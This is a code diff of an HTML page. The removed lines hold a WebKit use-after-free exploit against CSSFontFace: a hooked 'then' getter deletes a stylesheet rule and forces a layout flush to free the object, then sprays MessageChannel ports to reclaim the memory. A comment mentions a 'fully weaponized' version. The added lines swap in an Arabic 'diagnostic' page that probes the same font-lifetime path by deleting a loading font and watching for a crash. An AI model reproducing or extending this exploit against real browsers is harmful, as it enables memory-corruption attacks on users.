@@ -1,113 +1,139 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-<style id="s">
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-</style>
+    <meta charset="UTF-8">
+    <title>أداة محاكاة وفحص استقرار الـ FontFace</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1a1a1a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #262626;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+        h2 {
+            color: #ffffff;
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+        }
+        button {
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #00cc00;
+        }
+        #debug-console {
+            background-color: #000;
+            border: 1px solid #444;
+            padding: 15px;
+            margin-top: 20px;
+            height: 300px;
+            overflow-y: scroll;
+            border-radius: 4px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .log-entry { margin-bottom: 5px; }
+        .info { color: #00ffff; }
+        .success { color: #00ff00; }
+        .warn { color: #ffff00; }
+        .error { color: #ff0000; }
+    </style>
 </head>
-<body style="background-color: #0a0a0a; color: #00ff00; font-family: monospace;">
+<body>
 
-<div id="log-container" style="padding: 10px; border: 1px solid #333; height: 400px; overflow-y: scroll; margin: 20px;">
-    [+] Exploit initialized. Awaiting target execution...<br>
+<div class="container">
+    <h2>منصة اختبار وفحص واجهة FontFace API</h2>
+    <p>اضغط على الزر أدناه لبدء عملية محاكاة تغيير الحالات ومراقبة سلوك الذاكرة وإدارة المراجع.</p>
+    
+    <button onclick="runDiagnosticTest()">بدء الفحص والاختبار</button>
+
+    <h3>سجل تصحيح الأخطاء (Debug Log):</h3>
+    <div id="debug-console">
+        <div class="log-entry info">[ النظام مستعد ] في انتظار بدء الاختبار...</div>
+    </div>
 </div>
 
 <script>
-// --- Direct On-Screen Logging ---
-function out(msg) {
-    let logBox = document.getElementById('log-container');
-    if (logBox) {
-        logBox.innerHTML += msg + "<br>";
-        logBox.scrollTop = logBox.scrollHeight;
-    }
-}
-
-if (window.testRunner) {
-    testRunner.dumpAsText();
-    testRunner.waitUntilDone();
-}
-
-// Global array to hold our grooming objects so they aren't garbage collected
-var sprayBlocks = [];
-
-// --- Precision Heap Grooming (MessageChannel Primitive) ---
-function executePrecisionGrooming() {
-    out("[*] Initiating precision heap grooming...");
-    
-    // The target size we are trying to reclaim (CSSFontFace)
-    const targetSize = 0x38; 
-    
-    // Using a very small iteration count to completely avoid the OOM killer.
-    // MessageChannels are small and stable, we don't need thousands of them.
-    const groomLimit = 80; 
-
-    out(`[*] Allocation primitive: MessageChannel Port Array, Iterations: ${groomLimit}`);
-
-    try {
-        for (let i = 0; i < groomLimit; i++) {
-            // MessageChannel creates two entangled ports. 
-            // The underlying C++ structures for these ports are very predictable in WebKit's memory.
-            let channel = new MessageChannel();
-            
-            // We store the ports to keep the underlying memory active
-            sprayBlocks.push(channel.port1);
-            sprayBlocks.push(channel.port2);
-            
-            // Note: In a fully weaponized exploit, we would use addEventListener on these ports
-            // to attach specific JavaScript objects that overlap with the freed CSSFontFace structure.
-            // For now, we are just claiming the memory space safely.
-        }
+    // دالة للطباعة داخل السجل الرسومي في الصفحة
+    function logToConsole(message, type = 'info') {
+        const consoleElement = document.getElementById('debug-console');
+        const timestamp = new Date().toISOString().slice(11, 19);
+        const logEntry = document.createElement('div');
         
-        out("[+] Grooming successful. Memory slots reclaimed without triggering OOM limit.");
-        out("[!] If the engine attempts to use the freed pointer now, it will hit our MessageChannel structures.");
+        logEntry.className = `log-entry ${type}`;
+        logEntry.innerText = `[${timestamp}] [${type.toUpperCase()}] ${message}`;
         
-    } catch (e) {
-        out("[-] FATAL: Allocation failed during grooming: " + e.message);
+        consoleElement.appendChild(logEntry);
+        consoleElement.scrollTop = consoleElement.scrollHeight; // التمرير التلقائي للأسفل
     }
-}
 
-window.onload = () => {
-    out("[*] Stage 1: Setting up FontFace triggers...");
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
+    async function runDiagnosticTest() {
+        logToConsole("بدء تهيئة الـ Test Harness...", "info");
 
-    let fired = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (!fired && this === A) {
-                fired = true;
-                out("[!] Stage 2: Hooked .then getter triggered by engine.");
-                
-                // Advance internal state
-                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                
-                out("[*] Stage 3: Deleting stylesheet rule (Initiating Free)...");
-                // Trigger the vulnerability: Tell the engine to delete the font rule
-                document.getElementById('s').sheet.deleteRule(0);
-                
-                out("[*] Stage 4: Forcing synchronous layout flush (Executing Free)...");
-                // Force the browser to process the deletion immediately, freeing the C++ object
-                document.body.offsetTop;
+        // 1. إنشاء مصفوفة بايتات لملف خط افتراضي (Mock Font Data)
+        const mockFontData = new Uint8Array([
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x80, 0x00, 0x03, 0x00, 0x20
+        ]);
+        
+        logToConsole("تم إنشاء كائن بايتات الخط الافتراضي في الذاكرة.", "info");
 
-                // The memory is now free. Claim it immediately before the C++ function resumes.
-                executePrecisionGrooming();
-            }
-            return undefined;
+        try {
+            // 2. إنشاء كائن FontFace وتحديد الحالات المتوقعة
+            logToConsole("محاولة إنشاء كائن FontFace جديد...", "info");
+            let testFont = new FontFace('AuditTargetFont', mockFontData);
+            logToConsole(`الحالة الابتدائية للخط: ${testFont.status}`, "success");
+
+            // 3. إضافة الخط إلى المستند (ثنائية الـ Clients المشتركة)
+            logToConsole("إضافة الخط إلى document.fonts لإنشاء مراجع (References)...", "info");
+            document.fonts.add(testFont);
+
+            // 4. استدعاء دالة التحميل لبدء معالجة المحرك (Status: loading)
+            logToConsole("استدعاء دالة ()testFont.load لبدء تغيير الحالة...", "info");
+            const loadPromise = testFont.load();
+            logToConsole(`الحالة الحالية أثناء المعالجة: ${testFont.status}`, "warn");
+
+            // 5. إعداد مستمعي الأحداث (Callbacks) لمحاكاة سلوك الاستدعاء الارتجاعي
+            loadPromise.then(() => {
+                logToConsole("النتيجة: تمت عملية التحميل بنجاح (سلوك طبيعي).", "success");
+            }).catch((err) => {
+                // الفشل هنا متوقع لأن ملف البايتات غير مكتمل، وهو المطلوب لتوليد الـ Error State
+                logToConsole(`تغيرت حالة الخط إلى خطأ: ${testFont.status} (تم تفعيل الـ Callback بنجاح)`, "warn");
+            });
+
+            // 6. محاكاة اختبار التداخل الإجباري (Forced Invalidation)
+            // نقوم بإزالة الخط مباشرة في نفس الدورة الزمنية لمعرفة كيف يتصرف المحرك مع المراجع المتبقية
+            logToConsole("تنفيذ عملية إزالة الخط من المستند بشكل فوري لقطع سلسلة المراجع...", "warn");
+            document.fonts.delete(testFont);
+
+            // 7. محاولة إفراغ الكائن يدوياً لتحفيز جلب المهملات (Garbage Collection Indicator)
+            testFont = null;
+            logToConsole("تم تعيين كائن الـ JavaScript إلى null. جاري فحص استقرار المتصفح...", "info");
+
+            // 8. التحقق من النتيجة النهائية للمحاكاة على مستوى الـ JavaScript
+            setTimeout(() => {
+                logToConsole("تمت دورة الاختبار بنجاح. إذا لم يحدث انهيار للمتصفح (Crash)، فهذا يعني أن المحرك محمي ضد هذا المسار أو يعالجه بشكل آمن.", "success");
+            }, 1000);
+
+        } catch (error) {
+            logToConsole(`حدث خطأ غير متوقع أثناء الفحص: ${error.message}`, "error");
         }
-    });
-
-    out("[*] Stage 0: Loading target font to enter CSSFontFace::pump()...");
-    // This call dives into the vulnerable C++ code
-    document.fonts.load('1em x', 'AB');
-    
-    setTimeout(() => {
-        if (window.testRunner)
-            testRunner.notifyDone();
-        out("[+] Execution completed. If system has not crashed, UAF is stable.");
-    }, 100);
-};
+    }
 </script>
+
 </body>
 </html>
